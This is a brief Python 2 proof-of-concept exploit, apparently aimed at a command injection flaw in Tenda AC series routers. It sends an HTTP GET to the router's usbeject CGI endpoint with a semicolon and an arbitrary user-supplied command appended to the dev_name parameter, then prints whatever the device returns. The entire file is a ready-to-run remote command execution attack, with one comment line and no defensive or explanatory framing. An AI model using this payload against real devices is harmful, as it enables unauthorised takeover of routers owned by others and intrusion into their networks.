#!/usr/bin/env python
# -*- coding: utf-8 -*-

#Without strict filter,it is possible to inject command in Tenda Ac series router.


import sys
import requests

def main(_ip,_port,_cmd):
	ip=_ip
	port=_port
	cmd=_cmd

	uri='http://%s:%s/cgi-bin/luci/usbeject?dev_name=;%s'%(ip,port,cmd)
	user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'
	header={'User-Agent':user_agent}

	res=requests.Session()
	try:
		ret=res.get(uri,headers=header,timeout=5)
		if ret.status_code not in [200]:
			print '   [-] Failed...'
			return False
		print ret.text
	except:
		print '   [-] Can\'t connect'
		return False

if __name__ == '__main__':
	main(sys.argv[1],sys.argv[2],sys.argv[3])
